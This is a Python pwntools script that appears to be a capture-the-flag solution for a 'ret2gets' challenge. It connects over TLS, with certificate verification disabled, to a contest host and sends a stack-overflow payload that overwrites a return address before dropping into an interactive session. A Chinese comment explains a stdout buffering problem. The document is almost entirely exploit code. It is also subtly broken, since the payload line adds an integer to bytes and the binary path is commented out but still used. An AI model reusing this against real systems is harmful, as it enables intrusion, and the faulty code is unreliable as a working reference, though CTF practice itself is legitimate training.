# python3 ret2gets.py REMOTE  #运行时加remote
from pwn import *
import ssl
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num                : io.recv(num)
ru      = lambda delims, drop=True  : io.recvuntil(delims, drop)
itr     = lambda                   : io.interactive()
uu32    = lambda data              : u32(data.ljust(4, b'\x00'))
uu64    = lambda data              : u64(data.ljust(8, b'\x00'))
context.log_level = 'debug'
#context.binary = binary = './ret2gets'
gdbscript = '''
'''
def start(argv=[], *a, **kw):
    if args.GDB:
        proc = process([binary] + argv, *a, **kw)
        gdb.attach(proc, gdbscript=gdbscript)
        return proc
    elif args.REMOTE:
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        host = 'e2ddc3ec92594cad54567754.tcp-ctf2.dasctf.com'
        port = 9999
        return remote(host, port, ssl=True, ssl_context=ssl_ctx)
    else:
        return process([binary] + argv, *a, **kw)

io = start()
#ru(b'please input\n')
'''
目标的 stdout 走管道是块缓冲，please input 一直躺在缓冲区里不出来，只有你发数据、程序往下走退出时才一次性 flush
。所以 ru(b'please input\n') 会一直阻塞到超时 —— 这就是"没有返回"的真正原因。程序根本还没收到你的 payload。
'''
payload = b'a' * (0x0F + 0x08)+0x40118A
sl(payload)
itr()